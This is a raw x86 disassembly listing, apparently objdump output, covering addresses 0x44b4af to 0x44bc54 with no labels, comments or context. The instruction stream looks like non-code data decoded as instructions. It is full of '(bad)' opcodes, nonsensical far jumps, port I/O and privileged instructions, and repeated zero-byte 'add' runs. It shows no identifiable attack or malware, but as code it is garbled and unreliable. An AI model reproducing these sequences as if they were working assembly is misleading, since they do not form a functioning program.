  44b4af:	xor    dh,0x21
  44b4b2:	xchg   ebp,eax
  44b4b3:	and    dh,0x21
  44b4b6:	dec    ebp
  44b4b7:	add    BYTE PTR [eax],al
  44b4b9:	add    BYTE PTR [eax],al
  44b4bb:	add    BYTE PTR [edi-0x78aaddea],cl
  44b4c1:	push   es
  44b4c2:	and    ch,BYTE PTR [ebp-0x61]
  44b4c5:	and    dh,BYTE PTR ss:[ebp-0x69]
  44b4c9:	and    al,BYTE PTR es:[eax]
  44b4cc:	or     eax,0x3d35b2b2
  44b4d1:	mov    cl,0xa2
  44b4d3:	xor    eax,0x35d2b1fd
  44b4d8:	std    
  44b4d9:	mov    cl,0xc2
  44b4db:	xor    eax,0x35f2b20d
  44b4e0:	std    
  44b4e1:	mov    cl,0xe2
  44b4e3:	xor    eax,0x3612af7d
  44b4e8:	jge    0x44b499
  44b4ea:	add    dh,BYTE PTR [esi]
  44b4ec:	dec    ebp
  44b4ed:	scas   eax,DWORD PTR es:[edi]
  44b4ee:	xor    dh,BYTE PTR [esi]
  44b4f0:	cmp    eax,0xbd3622af
  44b4f5:	mov    al,0x52
  44b4f7:	ss jge 0x44b4aa
  44b4fa:	inc    edx
  44b4fb:	ss dec ebp
  44b4fd:	scas   eax,DWORD PTR es:[edi]
  44b4fe:	jb     0x44b536
  44b500:	cmp    eax,0xbd3662af
  44b505:	mov    al,0x92
  44b507:	ss mov ebp,0xd3682b0
  44b50d:	mov    al,0xb2
  44b50f:	ss mov ebp,0x7d36a2b0
  44b515:	mov    al,0xd2
  44b517:	ss jge 0x44b4ca
  44b51a:	ret    0x8d36
  44b51d:	mov    al,0xf2
  44b51f:	add    BYTE PTR ss:[eax],al
  44b522:	add    BYTE PTR [eax],al
  44b524:	add    BYTE PTR [ebp-0x50],bh
  44b527:	loop   0x44b55f
  44b529:	std    
  44b52a:	lods   eax,DWORD PTR ds:[esi]
  44b52b:	adc    dh,BYTE PTR [edi]
  44b52d:	std    
  44b52e:	lods   eax,DWORD PTR ds:[esi]
  44b52f:	add    dh,BYTE PTR [edi]
  44b531:	int    0xad
  44b533:	xor    dh,BYTE PTR [edi]
  44b535:	cmp    eax,0x3d3722ae
  44b53a:	scas   al,BYTE PTR es:[edi]
  44b53b:	push   edx
  44b53c:	aaa    
  44b53d:	std    
  44b53e:	lods   eax,DWORD PTR ds:[esi]
  44b53f:	inc    edx
  44b540:	aaa    
  44b541:	dec    ebp
  44b542:	scas   eax,DWORD PTR es:[edi]
  44b543:	jb     0x44b57c
  44b545:	cmp    eax,0x903762af
  44b54a:	bndstx [edi+edi*2-0x786be4f9],bnd0
  44b552:	das    
  44b553:	sbb    esp,DWORD PTR [edi+edi*2+0x67b41b07]
  44b55a:	dec    edi
  44b55b:	sbb    eax,esp
  44b55d:	pop    edi
  44b55e:	daa    
  44b55f:	sbb    edx,esp
  44b561:	addr16 das 
  44b563:	sbb    esp,esp
  44b565:	pop    edi
  44b566:	daa    
  44b567:	sbb    esi,esp
  44b569:	(bad)  
  44b56a:	lea    edx,[esp+eax*1]
  44b56d:	enter  0x1485,0x14
  44b571:	mov    eax,0xb824146d
  44b576:	inc    ebp
  44b577:	adc    al,0x34
  44b579:	test   al,0xcd
  44b57b:	sbb    al,BYTE PTR [eax+ebp*4-0x5b]
  44b57f:	sbb    dl,BYTE PTR [eax+ebx*4+0x6d]
  44b583:	adc    al,0x64
  44b585:	cwde   
  44b586:	gs adc al,0x74
  44b589:	add    BYTE PTR [eax],al
  44b58b:	add    BYTE PTR [eax],al
  44b58d:	add    BYTE PTR [eax-0x777bebf3],cl
  44b593:	add    eax,0x2d789414
  44b598:	adc    al,0xa4
  44b59a:	js     0x44b5a1
  44b59c:	adc    al,0xb4
  44b59e:	push   0x68c413cd
  44b5a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b5a4:	adc    edx,esp
  44b5a6:	pop    eax
  44b5a7:	lods   eax,DWORD PTR ds:[esi]
  44b5a8:	adc    esp,esp
  44b5aa:	pop    eax
  44b5ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b5ac:	adc    esi,esp
  44b5ae:	enter  0x158d,0x4
  44b5b2:	leave  
  44b5b3:	test   DWORD PTR ds:0x156db914,edx
  44b5b9:	and    al,0xb9
  44b5bb:	inc    ebp
  44b5bc:	adc    eax,0x154da934
  44b5c1:	inc    esp
  44b5c2:	test   eax,0x99541525
  44b5c7:	mov    dl,0x59
  44b5c9:	std    
  44b5ca:	jae    0x44b585
  44b5cc:	inc    ecx
  44b5cd:	std    
  44b5ce:	inc    ebx
  44b5cf:	mov    ecx,0xba13fd79
  44b5d4:	popa   
  44b5d5:	std    
  44b5d6:	and    edi,DWORD PTR [edx-0x460c0267]
  44b5dc:	popa   
  44b5dd:	std    
  44b5de:	jecxz  0x44b599
  44b5e0:	mov    ecx,0x81b9d3fd
  44b5e5:	std    
  44b5e6:	ret    
  44b5e7:	mov    ecx,0xb9b3fd99
  44b5ec:	cmp    ebp,0xfdf9b983
  44b5f2:	add    BYTE PTR [eax],al
  44b5f4:	add    BYTE PTR [eax],al
  44b5f6:	add    BYTE PTR [ebx-0x5c021e44],dl
  44b5fc:	mov    esp,0xbcb3fdd9
  44b601:	mov    eax,ds:0x39bca3fd
  44b606:	(bad)  
  44b607:	sar    DWORD PTR [ecx+eax*1-0x26433c02],cl
  44b60e:	std    
  44b60f:	repz mov esp,0xbcc3fdc1
  44b615:	jns    0x44b615
  44b617:	adc    edi,DWORD PTR [ecx+eiz*2-0x6643dc02]
  44b61e:	(bad)  
  44b61f:	aaa    
  44b620:	jg     0x44b618
  44b622:	mov    bl,0x2f
  44b624:	jg     0x44b66c
  44b626:	pop    es
  44b627:	nop
  44b628:	mov    dl,0x19
  44b62a:	hlt    
  44b62b:	cmp    eax,edx
  44b62d:	add    esp,esi
  44b62f:	sub    eax,edx
  44b631:	or     esp,esi
  44b633:	or     eax,edx
  44b635:	icebp  
  44b636:	hlt    
  44b637:	fwait
  44b638:	sar    ecx,0xf4
  44b63b:	fwait
  44b63c:	rol    ecx,0xf4
  44b63f:	stos   DWORD PTR es:[edi],eax
  44b640:	shr    DWORD PTR [ecx+0xec1abf4],0xa5
  44b647:	fsub   st(2),st
  44b649:	sbb    eax,0x1ddae48d
  44b64e:	push   ebp
  44b64f:	fisttp QWORD PTR [edx]
  44b651:	push   ds
  44b652:	pop    ebp
  44b653:	(bad)  
  44b656:	gs mov esp,0x6d1e2a
  44b65c:	add    BYTE PTR [eax],al
  44b65e:	add    BYTE PTR [eax],al
  44b660:	les    ebx,FWORD PTR [edx]
  44b662:	push   ds
  44b663:	xchg   ebp,eax
  44b664:	mov    esp,0xa47d1e4a
  44b669:	cmp    bl,BYTE PTR [esi]
  44b66b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b66c:	pushf  
  44b66d:	push   0x1e
  44b66f:	lea    esp,[edx+ebx*2-0x75636ae2]
  44b676:	push   ds
  44b677:	popf   
  44b678:	test   BYTE PTR [edx+0x1e],bh
  44b67b:	in     eax,0x7d
  44b67d:	stos   BYTE PTR es:[edi],al
  44b67e:	sbb    al,0xed
  44b680:	test   DWORD PTR [edx-0x35822ae4],ebx
  44b686:	sbb    al,0xbd
  44b688:	gs mov edx,0xea5e251c
  44b68e:	sbb    al,0xd
  44b690:	data16 ficomp DWORD PTR [edx*8-0x22e2f5a3]
  44b698:	inc    ebp
  44b699:	cli    
  44b69a:	sbb    al,0x65
  44b69c:	cmp    eax,0x456d1d2a
  44b6a1:	sbb    bl,BYTE PTR ds:0x1d4a3d95
  44b6a7:	jge    0x44b6ce
  44b6a9:	cmp    bl,BYTE PTR ds:0x1d6a1d25
  44b6af:	or     eax,0x151d5a25
  44b6b4:	sbb    eax,0x51d1d8a
  44b6b9:	jp     0x44b6d8
  44b6bb:	in     eax,0xfe
  44b6bd:	test   eax,0x9a06ed1b
  44b6c2:	sbb    eax,DWORD PTR [eax]
  44b6c4:	add    BYTE PTR [eax],al
  44b6c6:	add    BYTE PTR [eax],al
  44b6c8:	add    ch,bl
  44b6ca:	test   BYTE PTR [ebx+esi*1],dh
  44b6cd:	sub    eax,0x2d332485
  44b6d2:	test   DWORD PTR [ebx+esi*1+0xd],edx
  44b6d6:	test   DWORD PTR [ebx+esi*1+0x3d],eax
  44b6da:	xchg   DWORD PTR [ebx+esi*1+0x6d],esi
  44b6de:	xchg   DWORD PTR [ebx+esi*1+0x2d],esp
  44b6e2:	xchg   DWORD PTR [ebx+esi*1+0x3384872d],edx
  44b6e9:	sbb    eax,0x2d33b488
  44b6ee:	xchg   DWORD PTR [ebx+esi*1+0x33d487ed],esp
  44b6f5:	or     eax,0xfd33c488
  44b6fa:	xchg   esp,esi
  44b6fc:	xor    ebp,DWORD PTR ds:0x6d33e487
  44b702:	test   DWORD PTR [esp+esi*1],edx
  44b705:	ins    DWORD PTR es:[edi],dx
  44b706:	test   DWORD PTR [esp+esi*1],eax
  44b709:	pop    ebp
  44b70a:	test   DWORD PTR [esp+esi*1],esi
  44b70d:	sub    eax,0xad342485
  44b712:	jp     0x44b768
  44b714:	xor    al,0x8d
  44b716:	jp     0x44b75c
  44b718:	xor    al,0x3d
  44b71a:	test   DWORD PTR [esp+esi*1+0x6d],esi
  44b71e:	test   DWORD PTR [esp+esi*1-0x53],esp
  44b722:	jp     0x44b6b8
  44b724:	xor    al,0xad
  44b726:	jp     0x44b6ac
  44b728:	xor    al,0x1d
  44b72a:	jp     0x44b6e0
  44b72c:	xor    al,0x0
  44b72e:	add    BYTE PTR [eax],al
  44b730:	add    BYTE PTR [eax],al
  44b732:	lods   eax,DWORD PTR ds:[esi]
  44b733:	jp     0x44b6d9
  44b735:	xor    al,0x6d
  44b737:	jp     0x44b70d
  44b739:	xor    al,0x8d
  44b73b:	jp     0x44b701
  44b73d:	xor    al,0x7d
  44b73f:	jp     0x44b735
  44b741:	xor    al,0xad
  44b743:	jp     0x44b729
  44b745:	xor    al,0x90
  44b747:	xchg   edi,eax
  44b748:	loope  0x44b755
  44b74a:	lds    ecx,FWORD PTR [edi+0x67bd1be1]
  44b750:	loope  0x44b77d
  44b752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b753:	aas    
  44b754:	loope  0x44b791
  44b756:	popf   
  44b757:	push   edi
  44b758:	loope  0x44b7a5
  44b75a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b75b:	das    
  44b75c:	loope  0x44b7b9
  44b75e:	popf   
  44b75f:	out    0xdf,eax
  44b761:	imul   eax,DWORD PTR [ebp+0x7d7bdfdf],0x17
  44b768:	loope  0x44b6f5
  44b76a:	test   DWORD PTR [edi],ecx
  44b76c:	loope  0x44b709
  44b76e:	jge    0x44b797
  44b770:	loope  0x44b71d
  44b772:	gs jmp eax
  44b775:	mov    ebx,0xcbe1575d
  44b77a:	gs das 
  44b77c:	loope  0x44b759
  44b77e:	pop    ebp
  44b77f:	daa    
  44b780:	loope  0x44b76d
  44b782:	lds    ebx,FWORD PTR ds:0x95bdfbe1
  44b788:	out    0xb,al
  44b78a:	(bad)  
  44b78b:	(bad)  
  44b78c:	out    0x1b,al
  44b78e:	mov    esi,0xa62be665
  44b793:	cmp    eax,0x3be6
  44b798:	add    BYTE PTR [eax],al
  44b79a:	add    BYTE PTR [esi-0x59b41b2b],bl
  44b7a0:	lods   eax,DWORD PTR ds:[esi]
  44b7a1:	in     al,0x5b
  44b7a3:	sahf   
  44b7a4:	gs out 0x6b,al
  44b7a7:	xchg   BYTE PTR [ebp-0x1a],bl
  44b7aa:	jnp    0x44b82a
  44b7ac:	adc    eax,0xd868be6
  44b7b1:	out    0x9b,al
  44b7b3:	jle    0x44b7da
  44b7b5:	out    0xab,al
  44b7b7:	data16 std 
  44b7b9:	in     eax,0xbb
  44b7bb:	pop    esi
  44b7bc:	aad    0xe5
  44b7be:	retf   
  44b7bf:	lods   ax,WORD PTR ds:[esi]
  44b7c1:	in     eax,0xdb
  44b7c3:	pop    esi
  44b7c4:	mov    dl,0x1
  44b7c6:	stc    
  44b7c7:	sti    
  44b7c8:	les    ecx,FWORD PTR [ecx]
  44b7ca:	stc    
  44b7cb:	or     eax,ebp
  44b7cd:	icebp  
  44b7ce:	clc    
  44b7cf:	mov    eax,ebx
  44b7d1:	stc    
  44b7d2:	clc    
  44b7d3:	fwait
  44b7d4:	ret    
  44b7d5:	sar    eax,0xbb
  44b7d8:	ret    
  44b7d9:	test   eax,0xb1c3abf8
  44b7de:	clc    
  44b7df:	dec    ebx
  44b7e0:	ret    
  44b7e1:	cdq    
  44b7e2:	clc    
  44b7e3:	cmp    eax,ebx
  44b7e5:	inc    ecx
  44b7e6:	idiv   DWORD PTR [ebx]
  44b7e8:	ret    
  44b7e9:	dec    ecx
  44b7ea:	test   DWORD PTR [ebx-0x3d],0xc40bf771
  44b7f1:	jns    0x44b7ea
  44b7f3:	sbb    eax,esp
  44b7f5:	xor    edi,0xf769c3fb
  44b7fb:	jmp    0x44b7c0
  44b7fd:	mov    cl,0xf7
  44b7ff:	add    BYTE PTR [eax],al
  44b801:	add    BYTE PTR [eax],al
  44b803:	add    bl,cl
  44b805:	ret    
  44b806:	cdq    
  44b807:	idiv   DWORD PTR [ebx+0x7bf781c3]
  44b80d:	ret    
  44b80e:	mov    edi,esi
  44b810:	mov    eax,ebx
  44b812:	icebp  
  44b813:	sti    
  44b814:	mov    edi,DWORD PTR [edx-0x45640407]
  44b81a:	sar    ebx,0xbb
  44b81d:	mov    edx,0xbaabfba9
  44b822:	xor    esp,edi
  44b824:	retf   
  44b825:	mov    edx,0xbabbfc19
  44b82a:	sar    ebx,0xbb
  44b82d:	mov    edx,0xbacbfbc9
  44b832:	jno    0x44b830
  44b834:	or     edi,DWORD PTR [edx-0x45e40387]
  44b83a:	cmp    esp,0xfc69b9fb
  44b840:	jmp    0x44b7fb
  44b842:	push   cs
  44b843:	and    eax,0x4527671c
  44b848:	adc    eax,0xd1d268f
  44b84d:	jg     0x44b875
  44b84f:	in     eax,0x9
  44b851:	scas   eax,DWORD PTR es:[edi]
  44b852:	and    al,0xfd
  44b854:	stc    
  44b855:	sahf   
  44b856:	and    al,0xc5
  44b858:	stc    
  44b859:	into   
  44b85a:	and    al,0xbd
  44b85c:	jmp    0xe9e9dd1f
  44b861:	out    dx,al
  44b862:	and    al,0x9d
  44b864:	(bad)  
  44b866:	and    al,0x85
  44b868:	add    BYTE PTR [eax],al
  44b86a:	add    BYTE PTR [eax],al
  44b86c:	add    cl,bl
  44b86e:	push   cs
  44b86f:	and    eax,0x24feca5d
  44b874:	gs leave 
  44b876:	cs and eax,0x251eb97d
  44b87c:	test   DWORD PTR [ecx-0x5682dab2],edi
  44b882:	ds and eax,0x256ea9a5
  44b888:	popf   
  44b889:	cdq    
  44b88a:	pop    esi
  44b88b:	and    eax,0x258e99c5
  44b890:	popf   
  44b891:	mov    DWORD PTR [esi-0x49751adb],eax
  44b897:	and    edi,ebp
  44b899:	jp     0x44b841
  44b89b:	and    eax,ebp
  44b89d:	jp     0x44b875
  44b89f:	and    edi,DWORD PTR [ebp+0x2523c66a]
  44b8a5:	imul   esi,esi,0x23
  44b8a8:	sbb    eax,0x523e65b
  44b8ad:	pop    ebx
  44b8ae:	push   ss
  44b8af:	and    al,0xdd
  44b8b1:	dec    edx
  44b8b2:	push   es
  44b8b3:	and    al,0x65
  44b8b5:	dec    edx
  44b8b6:	ss and al,0x7d
  44b8b9:	cmp    ah,BYTE PTR [esi]
  44b8bb:	and    al,0x85
  44b8bd:	cmp    dl,BYTE PTR [esi+0x24]
  44b8c0:	add    BYTE PTR [ebp+0x6d3b9c7c],ch
  44b8c6:	jl     0x44b894
  44b8c8:	cmp    edi,DWORD PTR [ebp+0x7c]
  44b8cb:	mov    esp,0xec7ccd3b
  44b8d0:	cmp    eax,DWORD PTR [eax]
  44b8d2:	add    BYTE PTR [eax],al
  44b8d4:	add    BYTE PTR [eax],al
  44b8d6:	lods   eax,DWORD PTR ds:[esi]
  44b8d7:	jl     0x44b8b5
  44b8d9:	cmp    ebp,ebp
  44b8db:	jns    0x44b8e9
  44b8dd:	cmp    al,0xfd
  44b8df:	jns    0x44b8dd
  44b8e1:	cmp    ecx,ebp
  44b8e3:	jns    0x44b911
  44b8e5:	cmp    al,0x2d
  44b8e7:	jp     0x44b905
  44b8e9:	cmp    al,0x2d
  44b8eb:	jp     0x44b939
  44b8ed:	cmp    al,0xfd
  44b8ef:	jns    0x44b92d
  44b8f1:	cmp    al,0xd
  44b8f3:	jp     0x44b961
  44b8f5:	cmp    al,0x6d
  44b8f7:	mov    dl,0x62
  44b8f9:	cmp    al,0x2d
  44b8fb:	mov    dl,0x92
  44b8fd:	cmp    al,0x3d
  44b8ff:	mov    dl,0x82
  44b901:	cmp    al,0xd
  44b903:	mov    bl,0xb2
  44b905:	cmp    al,0x2d
  44b907:	mov    dl,0xa2
  44b909:	cmp    al,0xed
  44b90b:	mov    dl,0xd2
  44b90d:	cmp    al,0xfd
  44b90f:	mov    dl,0xc2
  44b911:	cmp    al,0xcd
  44b913:	mov    dl,0xf2
  44b915:	cmp    al,0x2d
  44b917:	mov    dl,0xe2
  44b919:	cmp    al,0x6d
  44b91b:	js     0x44b929
  44b91d:	cmp    eax,0x3cfc787d
  44b922:	dec    ebp
  44b923:	js     0x44b951
  44b925:	cmp    eax,0x3d1c782d
  44b92a:	lods   eax,DWORD PTR ds:[esi]
  44b92b:	jns    0x44b979
  44b92d:	cmp    eax,0x3d3c797d
  44b932:	lea    edi,[ecx+0x6c]
  44b935:	cmp    eax,0x3d5c786d
  44b93a:	add    BYTE PTR [eax],al
  44b93c:	add    BYTE PTR [eax],al
  44b93e:	add    BYTE PTR [ebp-0x6fc27387],ch
  44b944:	mul    edi
  44b946:	xchg   ebx,eax
  44b947:	jne    0x44b978
  44b949:	call   0xe83c26f1
  44b94e:	mov    bl,0x65
  44b950:	iret   
  44b951:	out    0xc3,eax
  44b953:	pop    ebp
  44b954:	xchg   edi,eax
  44b955:	out    0xd3,eax
  44b957:	push   ebp
  44b958:	out    dx,eax
  44b959:	out    0xe3,eax
  44b95b:	int    0x97
  44b95d:	out    0xf3,eax
  44b95f:	lds    ecx,FWORD PTR [edi+0x77be03ea]
  44b965:	jmp    0xae23:0xea6fb613
  44b96c:	aaa    
  44b96d:	jmp    0x9e43:0xea4fa633
  44b974:	pop    ss
  44b975:	jmp    0x8e63:0xea2f9653
  44b97c:	xlat   BYTE PTR ds:[ebx]
  44b97d:	call   0xea543ff5
  44b982:	cmp    DWORD PTR [esi-0x9],0xffffffe9
  44b986:	xchg   ebx,eax
  44b987:	jbe    0x44b9b8
  44b989:	jmp    0x66b3:0xe9f76ea3
  44b990:	dec    edi
  44b991:	jmp    0x56d3:0xea175ec3
  44b998:	outs   dx,DWORD PTR ds:[esi]
  44b999:	jmp    0xc6f3:0xea15cee3
  44b9a0:	(bad)  
  44b9a1:	jmp    0x44b9a6
  44b9a3:	add    BYTE PTR [eax],al
  44b9a5:	add    BYTE PTR [eax],al
  44b9a7:	add    BYTE PTR [edi-0x48ec148b],bh
  44b9ad:	ins    DWORD PTR es:[edi],dx
  44b9ae:	jmp    0x44b9d3
  44b9b0:	scas   eax,DWORD PTR es:[edi]
  44b9b1:	xor    eax,0xcda733eb
  44b9b6:	jmp    0xe9da58fe
  44b9bb:	push   ebx
  44b9bc:	xchg   edi,eax
  44b9bd:	lods   eax,DWORD PTR ds:[esi]
  44b9be:	jmp    0xc9f74926
  44b9c3:	cld    
  44b9c4:	ret    
  44b9c5:	mov    bh,0x71
  44b9c7:	cld    
  44b9c8:	adc    edi,DWORD PTR [eax-0x47dc0397]
  44b9ce:	xchg   ecx,eax
  44b9cf:	cld    
  44b9d0:	repz mov bh,0x69
  44b9d3:	cld    
  44b9d4:	jecxz  0x44b98d
  44b9d6:	xor    esp,edi
  44b9d8:	push   ebx
  44b9d9:	mov    eax,0xb843fc09
  44b9de:	push   ecx
  44b9df:	cld    
  44b9e0:	repz mov bh,0x9
  44b9e3:	cld    
  44b9e4:	add    edi,DWORD PTR [eax-0x4d6f7c0b]
  44b9ea:	imul   eax,DWORD PTR [edx],0xf3f1b290
  44b9f0:	xchg   ebx,eax
  44b9f1:	ret    0xf3c9
  44b9f4:	add    edx,0xffffffd1
  44b9f7:	repz mov bl,0xc2
  44b9fa:	test   eax,0xb1c2a3f3
  44b9ff:	repz push ebx
  44ba01:	ret    0xf429
  44ba04:	arpl   dx,ax
  44ba06:	push   ecx
  44ba07:	hlt    
  44ba08:	xor    eax,edx
  44ba0a:	dec    ecx
  44ba0b:	hlt    
  44ba0c:	add    BYTE PTR [eax],al
  44ba0e:	add    BYTE PTR [eax],al
  44ba10:	add    BYTE PTR [ebx-0x3e],al
  44ba13:	jno    0x44ba09
  44ba15:	adc    eax,ebx
  44ba17:	dec    ecx
  44ba18:	hlt    
  44ba19:	add    eax,ebx
  44ba1b:	xchg   ecx,eax
  44ba1c:	hlt    
  44ba1d:	repz ret 0xf469
  44ba21:	jecxz  0x44b9e5
  44ba23:	mov    cl,0xf4
  44ba25:	push   ebx
  44ba26:	ret    0xf4a9
  44ba29:	arpl   dx,ax
  44ba2b:	xchg   ecx,eax
  44ba2c:	hlt    
  44ba2d:	jae    0x44b9f1
  44ba2f:	mov    esp,esi
  44ba31:	add    edx,0xfffffff1
  44ba34:	hlt    
  44ba35:	xchg   ebx,eax
  44ba36:	ror    ecx,0xf4
  44ba39:	add    ecx,0xffffffd1
  44ba3c:	hlt    
  44ba3d:	mov    bl,0xc1
  44ba3f:	push   cs
  44ba40:	mov    ebp,0x251dc35c
  44ba45:	inc    ebp
  44ba46:	repz sbb eax,0x1de33cbd
  44ba4c:	lds    eax,FWORD PTR [ebx+edx*1+0x1e]
  44ba50:	fnstsw WORD PTR [ebx+eax*1]
  44ba53:	push   ds
  44ba54:	gs and eax,0x1d5d1e33
  44ba5a:	and    ebx,DWORD PTR [esi]
  44ba5c:	test   DWORD PTR ds:0x1d7d1e53,esp
  44ba62:	inc    ebx
  44ba63:	push   ds
  44ba64:	and    eax,0x3d1e7305
  44ba69:	std    
  44ba6a:	bound  ebx,QWORD PTR [esi]
  44ba6c:	push   ebp
  44ba6d:	add    eax,DWORD PTR [ebx+0x20]
  44ba70:	sub    eax,0x35207303
  44ba75:	add    BYTE PTR [eax],al
  44ba77:	add    BYTE PTR [eax],al
  44ba79:	add    bl,ah
  44ba7b:	bound  esp,QWORD PTR [eax]
  44ba7d:	or     eax,0xf52092e3
  44ba82:	loop   0x44ba06
  44ba84:	and    ch,ch
  44ba86:	(bad)  [edx-0x5d342ada]
  44ba8c:	es or  eax,0x1526d2c4
  44ba92:	mov    esp,0xb42d26c2
  44ba97:	repnz es xor eax,0x4d26e2ac
  44ba9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ba9f:	adc    ah,BYTE PTR [edi]
  44baa1:	xor    eax,0x6d27029c
  44baa6:	fwait
  44baa7:	cmp    ah,BYTE PTR [edi]
  44baa9:	mov    eax,ds:0xb927728b
  44baae:	mov    ebp,DWORD PTR [edx+0x27]
  44bab1:	sar    DWORD PTR [ebx+0x62],0x27
  44bab5:	mov    DWORD PTR [ebx+0x5a],edi
  44bab8:	daa    
  44bab9:	sub    DWORD PTR [ebx-0x6e],0x79e90027
  44bac0:	hlt    
  44bac1:	cmp    BYTE PTR [ecx],dl
  44bac3:	jp     0x44baa1
  44bac5:	cmp    BYTE PTR [ecx+0x77],ch
  44bac8:	in     al,0x38
  44baca:	xor    DWORD PTR [edi+0xc],esi
  44bacd:	cmp    DWORD PTR [ecx+0x77],ecx
  44bad0:	lock cmp ebp,ecx
  44bad3:	jbe    0x44bacd
  44bad5:	cmp    ebp,edx
  44bad7:	jbe    0x44bab9
  44bad9:	cmp    ebp,ebx
  44badb:	jbe    0x44bac5
  44badd:	cmp    DWORD PTR [eax],eax
  44badf:	add    BYTE PTR [eax],al
  44bae1:	add    BYTE PTR [eax],al
  44bae3:	xor    eax,0x2d3a1078
  44bae8:	js     0x44bb02
  44baea:	cmp    dh,BYTE PTR ds:0x53a3878
  44baf0:	js     0x44bb12
  44baf2:	cmp    ch,ch
  44baf4:	ja     0x44bb1e
  44baf6:	cmp    dh,BYTE PTR ds:0x2d3a5078
  44bafc:	js     0x44bb56
  44bafe:	cmp    ah,BYTE PTR ds:0x2d3a4078
  44bb04:	js     0x44bb4e
  44bb06:	cmp    dl,BYTE PTR ds:0x553a7078
  44bb0c:	ja     0x44ba9e
  44bb0e:	cmp    ch,BYTE PTR [ebp+0x77]
  44bb11:	cwde   
  44bb12:	cmp    al,BYTE PTR [ebp+0x74]
  44bb15:	cmp    BYTE PTR [edx],0xd5
  44bb18:	je     0x44bb0a
  44bb1a:	cmp    cl,ch
  44bb1c:	je     0x44bb16
  44bb1e:	cmp    al,ch
  44bb20:	je     0x44bb02
  44bb22:	cmp    cl,ch
  44bb24:	je     0x44bb0e
  44bb26:	cmp    dh,BYTE PTR [ebp-0x1ac4ef8a]
  44bb2c:	ja     0x44bafe
  44bb2e:	cmp    ebp,DWORD PTR ds:0x513bd477
  44bb34:	ja     0x44baf2
  44bb36:	cmp    ecx,DWORD PTR [ecx]
  44bb38:	ja     0x44bafe
  44bb3a:	cmp    edx,DWORD PTR [eax-0x541c15cd]
  44bb40:	sbb    ebp,edx
  44bb42:	jmp    0x44baef
  44bb44:	xor    ebp,edx
  44bb46:	repz add BYTE PTR [eax],al
  44bb49:	add    BYTE PTR [eax],al
  44bb4b:	add    BYTE PTR [ebx-0x6bd01f75],bl
  44bb51:	aaa    
  44bb52:	loopne 0x44bb8b
  44bb54:	mov    WORD PTR [edi-0x20],es
  44bb57:	aas    
  44bb58:	test   BYTE PTR [edi-0x20],al
  44bb5b:	inc    edi
  44bb5c:	jl     0x44bba5
  44bb5e:	loopne 0x44bbaf
  44bb60:	je     0x44bb99
  44bb62:	loopne 0x44baff
  44bb64:	ins    DWORD PTR es:[edi],dx
  44bb65:	xor    esp,eax
  44bb67:	mov    ds:0xabdffb65,eax
  44bb6c:	pop    ebp
  44bb6d:	xor    esp,eax
  44bb6f:	mov    bl,0x55
  44bb71:	retf   
  44bb72:	fistp  QWORD PTR [ebx-0x3c202c33]
  44bb78:	lds    edi,FWORD PTR [ebx+0x3bbe6fdf]
  44bb7e:	out    0x4b,eax
  44bb80:	mov    bh,0x43
  44bb82:	out    0x53,eax
  44bb84:	scas   eax,DWORD PTR es:[edi]
  44bb85:	sub    esp,edi
  44bb87:	pop    ebx
  44bb88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bb89:	and    esp,edi
  44bb8b:	arpl   WORD PTR [edi-0x68201905],bx
  44bb91:	mov    ebp,DWORD PTR [eax+eax*1-0x70]
  44bb95:	lahf   
  44bb96:	adc    al,BYTE PTR [eax]
  44bb98:	nop
  44bb99:	xlat   BYTE PTR ds:[ebx]
  44bb9a:	loope  0x44bc13
  44bb9c:	adc    edi,0xffffffe1
  44bb9f:	jg     0x44bb24
  44bba1:	pop    es
  44bba2:	jecxz  0x44bb2b
  44bba4:	arpl   di,dx
  44bba6:	loop   0x44bb37
  44bba8:	arpl   di,dx
  44bbaa:	loop   0x44bb43
  44bbac:	arpl   di,dx
  44bbae:	loop   0x44bb4f
  44bbb0:	add    BYTE PTR [eax],al
  44bbb2:	add    BYTE PTR [eax],al
  44bbb4:	add    BYTE PTR [ebx+0x27],ah
  44bbb7:	jecxz  0x44bb60
  44bbb9:	ret    
  44bbba:	in     eax,0xf7
  44bbbc:	lahf   
  44bbbd:	mov    esp,0x37ef59b2
  44bbc2:	mov    edi,0xbf27ef59
  44bbc7:	dec    ecx
  44bbc8:	out    dx,eax
  44bbc9:	daa    
  44bbca:	mov    edi,0xbf63ef7d
  44bbcf:	cmc    
  44bbd0:	out    dx,al
  44bbd1:	pop    ebx
  44bbd2:	mov    edi,0xbe6fee91
  44bbd7:	xchg   ecx,eax
  44bbd8:	out    dx,al
  44bbd9:	xchg   edi,eax
  44bbda:	mov    esp,0xbc97f1c9
  44bbdf:	jmp    0xea0163d5
  44bbe4:	icebp  
  44bbe5:	xchg   edi,eax
  44bbe6:	mov    esp,0xbcc7f219
  44bbeb:	mov    ecx,0xd9bcc7f1
  44bbf0:	icebp  
  44bbf1:	mov    bh,0xbc
  44bbf3:	fyl2x  
  44bbf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bbf6:	mov    esp,0xbc87f1a9
  44bbfb:	mov    ecx,0x79bc87f1
  44bc00:	icebp  
  44bc01:	pop    ss
  44bc02:	mov    ebp,0xbd07f179
  44bc07:	imul   esi,ecx,0xf179bd07
  44bc0d:	pop    es
  44bc0e:	mov    ebp,0xbd37f159
  44bc13:	adc    eax,0xdbcbbf1
  44bc18:	icebp  
  44bc19:	add    BYTE PTR [eax],al
  44bc1b:	add    BYTE PTR [eax],al
  44bc1d:	add    BYTE PTR [ebx+0x7dfbc1bc],dh
  44bc23:	mov    edx,0xba35fc56
  44bc28:	xchg   esp,eax
  44bc29:	cld    
  44bc2a:	in     eax,0xba
  44bc2c:	mov    eax,ds:0xe3babbfc
  44bc31:	cld    
  44bc32:	mov    bh,BYTE PTR [ecx-0x46b702f5]
  44bc38:	cmp    edi,ebp
  44bc3a:	pop    ss
  44bc3b:	mov    ecx,0x618d6c0e
  44bc40:	es mov esi,0xce24a185
  44bc46:	jns    0x44bc17
  44bc48:	and    al,0x7
  44bc4a:	jp     0x44bc8e
  44bc4c:	and    eax,0x25566ab1
  44bc51:	icebp  
  44bc52:	push   0xffffffb9
  44bc54:	and    esi,DWORD PTR [ebp+0x5b]
